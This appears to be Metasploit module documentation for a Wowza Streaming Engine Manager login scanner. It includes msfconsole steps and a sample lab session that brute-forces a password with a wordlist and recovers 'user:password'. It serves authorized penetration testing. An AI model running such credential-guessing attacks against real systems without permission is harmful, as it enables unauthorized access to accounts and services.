## Vulnerable Application

This module will attempt to authenticate to Wowza Streaming Engine
via Wowza Streaming Engine Manager web interface.


## Installation Steps

Download and install [Wowza Streaming Engine](https://portal.wowza.com/account/downloads).


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use modules/auxiliary/scanner/http/wowza_streaming_engine_manager_login`
1. Do: `set rhosts <rhosts>`
1. Do: `run`
1. On success you should get valid credentials.

## Options

### USERNAME

The username for Wowza Streaming Engine Manager.

### PASSWORD

The password for Wowza Streaming Engine Manager.

### TARGETURI

The path to Wowza Streaming Engine Manager.


## Scenarios


### Wowza Streaming Engine Manager Version 4.8.20+1 (build 20220919162035) on Ubuntu 22.04

```
msf6 > use auxiliary/scanner/http/wowza_streaming_engine_manager_login 
msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set rhosts 192.168.200.158
rhosts => 192.168.200.158
msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set username user
username => user
msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set pass_file data/wordlists/unix_passwords.txt
pass_file => data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > run

[+] 192.168.200.158:8088 - Found Wowza Streaming Engine Manager
[-] 192.168.200.158:8088 - Failed: 'user:admin'
[-] 192.168.200.158:8088 - Failed: 'user:123456'
[-] 192.168.200.158:8088 - Failed: 'user:12345'
[-] 192.168.200.158:8088 - Failed: 'user:123456789'
[+] 192.168.200.158:8088 - Success: 'user:password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > creds
Credentials
===========

host             origin           service          public  private   realm  private_type  JtR Format
----             ------           -------          ------  -------   -----  ------------  ----------
192.168.200.158  192.168.200.158  8088/tcp (http)  user    password         Password      
```
